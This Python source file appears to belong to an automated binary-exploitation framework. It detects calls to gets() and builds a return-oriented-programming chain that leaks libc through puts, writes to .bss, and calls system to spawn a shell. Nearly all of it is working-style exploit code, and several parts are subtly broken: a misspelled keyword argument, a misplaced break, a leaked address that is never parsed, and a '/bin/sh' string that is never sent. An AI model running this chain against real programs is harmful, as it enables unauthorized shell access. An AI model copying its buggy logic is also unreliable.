import smrop

import pwn

ANALYSES = []
def register(clazz):
    # TODO: probably don't want to instantiate
    # here, makes more sense to instantiate
    # when the program context is available.
    c = clazz()
    ANALYSES.append(c)

class Vulnerability:
    def __init__(self, function, binary : ELF, libc : ELF):
        raise NotImplementedError()

    def detect(self, function, program):
        raise NotImplementedError()
    
    def exploit(self, function):
        raise NotImplementedError()

@register
class GetsVulnerability(Vulnerability):

    def __init__(self, function, binary : pwn.ELF, libc : pwn.ELF):
        self.function = function
        self.binary = binary
        self.libc = libc

    def detect(self, function, program):
        # TODO: I *think* this is where we actually
        # instantiate the exploit. Maybe detect
        # is a static method?
        for call in function["calls"]:
            if call["funcName"] == "gets":
                return True
        return False

    def exploit(self, conn):
        function_addr = int(self.function["addr"], 16) 
        getscall = None
        for call in self.function["calls"]:
            if call["funcName"] == "gets":
                getscall = call
            break
        # assume stack for now
        # need to add check to validate
        # that the argument is on the stack.
        # otherwise, this is not exploitable
        # via this technique
        # TODO: Add check
        arg = getscall["arguments"][0]
        stackoffset = arg["stackOffset"]
        
        prefix = "A"*stackoffset

        # leak libc location
        sm = smrop.Smrop(binary=self.binary, libc=self.libc)
        sm.prefix(prefix)
        sm.pop_rdi(self.binary.got["gets"])
        sm.ret(binary="puts")
        sm.ret(function_addr)

        payload1 = sm.resolve(binary=self.binary, libc=self.libc)

        # read libc location
        conn.recv()
        conn.send(payload1)
        gets_location = conn.recvline()
        conn.recv()

        libcoffset = gets_location - self.libc.symbols["gets"]

        # send /bin/sh
        sm = smrop.Smrop(binary=self.binary, libc=self.libc)
        sm.prefix(prefix)
        sm.pop_rdi(self.binary.bss())
        sm.ret(binary="gets")
        sm.ret(function_addr)
        payload2 = sm.resolve(binary=self.binary)
        
        conn.send(payload2)

        sm = smrop.Smrop(bianry=self.binary, libc=self.libc)
        sm.prefix(prefix)
        sm.pop_rdi(self.binary.bss())
        sm.ret(libc="system")

        payload3 = sm.resolve(binary=0x0, libc=libcoffset)

        conn.send(payload3)